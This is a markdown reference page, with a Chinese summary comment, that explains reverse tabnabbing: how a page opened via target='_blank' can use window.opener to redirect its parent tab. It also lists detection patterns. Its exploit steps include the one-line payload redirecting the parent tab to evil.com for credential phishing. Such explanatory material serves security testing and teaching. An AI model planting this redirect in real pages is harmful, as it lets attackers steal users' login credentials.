<!--
 * [业务问题]: 标签页劫持（Tabnabbing / Reverse Tabnabbing）是一种网络钓鱼攻击，攻击者利用新标签页打开链接的特性（target="_blank"），通过 window.opener 对象篡改父标签页的地址，将其重定向到钓鱼页面以窃取用户凭证。
 * [实现逻辑]: 本文档介绍了 Tabnabbing 的原理、检测方法（检查 rel="noopener" 缺失）以及利用步骤（window.opener.location 重定向），并提供了检测工具链接。
 -->

# Tabnabbing (标签页劫持 / 反向标签页劫持)

> 反向标签页劫持（Reverse Tabnabbing）是一种攻击，从目标页面链接出的页面能够重写该页面，例如将其替换为钓鱼网站。由于用户最初是在正确的页面上，他们不太可能注意到它已被更改为钓鱼网站，特别是如果该网站看起来与目标网站相同。如果用户在这个新页面上进行身份验证，那么他们的凭据（或其他敏感数据）将被发送到钓鱼网站，而不是合法网站。

## 概要 (Summary)


## Summary

* [Tools](#tools)
* [Methodology](#methodology)
* [Exploit](#exploit)
* [Discover](#discover)
* [References](#references)


## Tools

- [PortSwigger/discovering-reversetabnabbing](https://portswigger.net/bappstore/80eb8fd46bf847b4b17861482c2f2a30) - Discovering Reverse Tabnabbing


## Methodology

When tabnabbing, the attacker searches for links that are inserted into the website and are under his control. Such links may be contained in a forum post, for example. Once he has found this kind of functionality, it checks that the link's `rel` attribute does not contain the value `noopener` and the target attribute contains the value `_blank`. If this is the case, the website is vulnerable to tabnabbing.


## Exploit 

1. Attacker posts a link to a website under his control that contains the following JS code: `window.opener.location = "http://evil.com"`
2. He tricks the victim into visiting the link, which is opened in the browser in a new tab.
3. At the same time the JS code is executed and the background tab is redirected to the website evil.com, which is most likely a phishing website.
4. If the victim opens the background tab again and doesn't look at the address bar, it may happen that he thinks he is logged out, because a login page appears, for example.
5. The victim tries to log on again and the attacker receives the credentials


## Discover

Search for the following link formats: 

```html
<a href="..." target="_blank" rel=""> 
<a href="..." target="_blank">
```


## References

- [Reverse Tabnabbing - OWASP - October 20, 2020](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)
- [Tabnabbing - Wikipedia - May 25, 2010](https://en.wikipedia.org/wiki/Tabnabbing)